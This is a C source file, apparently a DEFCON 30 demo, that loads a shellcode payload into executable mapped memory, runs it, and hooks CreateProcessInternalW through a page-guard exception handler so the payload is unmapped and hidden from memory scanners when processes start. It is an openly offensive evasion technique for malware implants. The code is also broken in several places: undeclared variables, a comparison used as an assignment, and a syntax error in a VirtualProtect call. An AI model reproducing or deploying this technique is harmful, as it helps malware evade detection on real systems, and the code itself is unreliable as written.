// Hide Process Memory - reenz0h / DEFCON30

#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <wincrypt.h>

#define _CRT_RAND_S
#include <stdlib.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")




unsigned char payload[] = { 0x0 };
unsigned int payload_len = sizeof(payload);


HANDLE g_MapFile = NULL;
LPVOID g_MapView = NULL;
int Map_size = 0x10000;

int Go(void) {
	BOOL rv;
	DWORD oldprotect = 0;
	
	printf("[+] Mapping new memory region\n");
	g_MapFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, Map_size, NULL);
	g_MapView = (LPBYTE)MapViewOfFile(g_MapFile, FILE_MAP_EXECUTE | FILE_MAP_ALL_ACCESS, 0, 0, 0);
	
	printf("[*] Copying payload to newly mapped memory region\n");
	RtlMoveMemory(g_MapView, payload, payload_len);
	
	printf("[*] Removing Originial Payload from memory (%#llx)\n", payload);
	memset(payload, 0, payload_len);
	
	printf("[*] Launching a new thread with payload\n\n");
	if (rv != 0) {
		globalThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) g_MapView, 0, 0, 0);
		WaitForSingleObject(globalThread, -1);
	}
	return 0;
}

BOOL myCreateProcessInternalW(HANDLE hToken, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation, PHANDLE hNewToken) {
	DWORD old = 0;
	
	UnmapViewOfFile(g_MapView);
	printf("[*] Global exec memory unmapped (%#x)\n", GetLastError());
	printf("Calling Originial CreateProcessInternalW()\n");
	BOOL res = pCreateProcessInternalW(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation, hNewToken);
	
	printf("[*] Going To Sleep (1m) (%#x)\n", res);
	Sleep(30000);
	printf("[+] Restoring payload memory\n");
	g_MapView = (LPBYTE)MapViewOfFile(g_MapFile, FILE_MAP_EXECUTE | FILE_MAP_ALL_ACCESS, 0, 0, 0);
	Sleep(10000);
	
	VirtualProtect(pCreateProcessInternalW, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);
	printf("[+] Page Guard re-set (%#x\n", GetLastError());
	
	return res;
}
	
// créer une exception 
LONG WINAPI handler(EXCEPTION_POINTERS * ExceptionInfo) {
	
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION) {
		
		if (ExceptionInfo->ContextRecord->Rip == (DWORD64)pCreateProcessInternalW) {
			/* 
			printf("[!] Exception (%#llx) ! Params:\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);
			printf("(1): %#llx | ", ExceptionInfo->ContextRecord->Rcx);
			printf("(2): %#llx | ", ExceptionInfo->ContextRecord->Rdx);
			printf("(3): %#llx | ", ExceptionInfo->ContextRecord->R8);
			printf("(4): %#llx | ", ExceptionInfo->ContextRecord->R9);
			printf("RSP = %#llx\n", ExceptionInfo->ContextRecord->Rsp);
			getchar();
			*/
			ExceptionInfo->ContextRecord->Rip == (DWORD64) &myCreateProcessInternalW;
		}
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

int main(void) {
	DWORD old = 0;
	
	pCreateProcessInternalW = (CreateProcessInternalW_t)GetProcAddress(GetModuleHandle("KERNELBASE.dll"), "CreateProcessInternalW");
	
	// passer l'exception en param
	AddVectoredExceptionHandler(1, &handler);
	
	VirtualProtect(pCreateProcessInternalW, 1, PAGE_EXECUTE_READ, | PAGE_GUARD, &old);
	printf("[*] Page Guard set (%#x)\n", GetLastError());
	Go();
	
	UnmapViewOfFile(g_MapView);
	CloseHandle(g_MapFile);
	return 0;
}
	
